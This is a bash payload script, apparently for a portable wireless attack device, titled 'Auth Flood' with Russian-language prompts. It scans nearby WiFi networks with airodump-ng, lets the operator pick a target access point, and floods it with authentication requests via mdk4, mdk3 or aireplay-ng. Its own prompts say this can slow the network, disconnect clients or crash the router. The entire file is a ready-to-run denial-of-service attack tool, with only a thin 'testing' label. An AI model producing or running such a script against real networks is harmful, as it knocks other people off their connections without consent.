#!/bin/bash
# Title: Auth Flood
# Author: bad-antics
# Description: Атака аутентификации для тестирования AP
# Category: nullsec/attack

# FIX: UI PATH and fallbacks
export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH
command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Press Enter: "; }
command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ERROR: $1" >&2; exit 1; }
command -v LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Done"; }
command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Choice: " choice; echo "${choice:-$2}"; }
command -v MAC_PICKER >/dev/null 2>&1 || MAC_PICKER() { echo "$1"; read -p "MAC: " mac; echo "$mac"; }
command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Confirm (y/n): " confirm; [ "$confirm" = "y" ] && echo "0" || echo "1"; }

# Автоопределение правильного беспроводного интерфейса (экспортирует $IFACE).
# Если ничего не подключено, показывает диалог ошибки.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

PROMPT "АВТОРИЗАЦИОННЫЙ ФЛУД

Атаковать целевой AP запросами аутентификации.

Может вызвать:
- Замедление
- Отключение клиентов
- Перезагрузку/сбой

Нажмите ОК, чтобы настроить."

PROMPT "ВЫБЕРИТЕ ЦЕЛЬ:

1. Сканировать и выбрать
2. Ввести BSSID вручную

Выберите опцию."

MODE=$(NUMBER_PICKER "Режим (1-2):" 1)

if [ "$MODE" -eq 1 ]; then
    SPINNER_START "Сканирование..."
    timeout 10 airodump-ng $IFACE --write-interval 1 -w /tmp/authscan --output-format csv 2>/dev/null
    SPINNER_STOP
    
    NET_COUNT=$(grep -c "WPA\|WEP\|OPN" /tmp/authscan*.csv 2>/dev/null || echo 0)
    PROMPT "Найдено $NET_COUNT сетей"
    
    TARGET_NUM=$(NUMBER_PICKER "Цель #:" 1)
    
    TARGET_LINE=$(grep "WPA\|WEP\|OPN" /tmp/authscan*.csv 2>/dev/null | sed -n "${TARGET_NUM}p")
    BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
    CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
    SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')
else
    BSSID=$(MAC_PICKER "BSSID цели:")
    CHANNEL=$(NUMBER_PICKER "Канал:" 6)
    SSID="target"
fi

DURATION=$(NUMBER_PICKER "Длительность (сек):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ ФЛУД?

Цель: $SSID
BSSID: $BSSID
Длительность: ${DURATION}s

Нажмите ОК для атаки.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

iwconfig $IFACE channel $CHANNEL

LOG "Флуд $SSID..."

if command -v mdk4 >/dev/null 2>&1; then
    timeout $DURATION mdk4 $IFACE a -a "$BSSID" &
elif command -v mdk3 >/dev/null 2>&1; then
    timeout $DURATION mdk3 $IFACE a -a "$BSSID" &
else
    # Запасной вариант: поддельная аутентификация
    timeout $DURATION aireplay-ng -1 0 -e "$SSID" -a "$BSSID" -h $(cat /sys/class/net/$IFACE/address) $IFACE &
fi

FLOOD_PID=$!

PROMPT "ФЛУД АКТИВЕН

Цель: $SSID

Нажмите ОК, чтобы ОСТАНОВИТЬ."

kill $FLOOD_PID 2>/dev/null
killall mdk4 mdk3 aireplay-ng 2>/dev/null

PROMPT "ФЛУД ОСТАНОВЛЕН

Цель: $SSID
Нажмите ОК, чтобы выйти."
